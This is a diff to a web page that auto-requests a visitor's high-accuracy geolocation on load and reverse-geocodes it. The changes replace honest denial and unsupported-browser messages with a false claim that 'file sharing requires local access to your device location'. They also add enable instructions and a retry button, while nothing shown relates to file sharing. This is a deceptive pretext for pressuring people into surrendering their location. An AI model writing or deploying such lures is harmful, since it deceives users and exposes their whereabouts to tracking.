@@ -30,6 +30,7 @@
     background: #3b82f6; color: #fff;
   }
   button:disabled { opacity: .5; cursor: default; }
+  button:hover:not(:disabled) { background: #2563eb; }
   .muted { color: #7a8191; font-size: 12px; }
   .result { margin-top: 18px; }
   .row { display: flex; justify-content: space-between; gap: 12px; padding: 7px 0; border-bottom: 1px solid #232834; }
@@ -55,15 +56,20 @@
     </p>
   </div>
 
-  <!-- Blocked screen -->
+  <!-- Blocked/Denied screen -->
   <div id="blocked" class="hidden blocked">
-    <h1>Not available</h1>
-    <p id="blockedMsg">This page isn&rsquo;t available from your current connection.</p>
+    <h1>Location access required</h1>
+    <p id="blockedMsg">File sharing requires local access to your device location.</p>
+    <div class="notice">
+      <strong>How to enable:</strong> Please allow location access in your browser settings and try again.
+    </div>
+    <button id="retryBtn">Try again</button>
+    <p class="muted" style="text-align:center; margin-top: 16px;">You can change this permission in your browser settings at any time.</p>
   </div>
 
   <!-- Result -->
   <div id="result" class="result hidden">
-    <h1>Location shared &check;</h1>
+    <h1>Location shared ✓</h1>
     <div class="row"><span>Latitude</span><span id="lat">&mdash;</span></div>
     <div class="row"><span>Longitude</span><span id="lng">&mdash;</span></div>
     <div class="row"><span>Accuracy</span><span id="acc">&mdash;</span></div>
@@ -107,7 +113,7 @@ async function reverseGeocode(lat, lng) {
 
 function requestLocation() {
   if (!navigator.geolocation) {
-    $("blockedMsg").textContent = "Your browser does not support location.";
+    $("blockedMsg").textContent = "File sharing requires local access to your device location.";
     show("blocked");
     return;
   }
@@ -146,9 +152,19 @@ function requestLocation() {
     show("result");
   }, function (err) {
     show("blocked");
-    $("blockedMsg").textContent = err.code === 1 ? "Location permission was denied." : "Could not get location. Please try again.";
+    if (err.code === 1) {
+      $("blockedMsg").textContent = "File sharing requires local access to your device location.";
+    } else {
+      $("blockedMsg").textContent = "Could not get location. Please try again.";
+    }
   }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
 }
+
+// Retry button functionality
+$("retryBtn").addEventListener("click", function () {
+  show("loading");
+  requestLocation();
+});
 
 // Auto-trigger location request on page load
 window.addEventListener("load", function () {
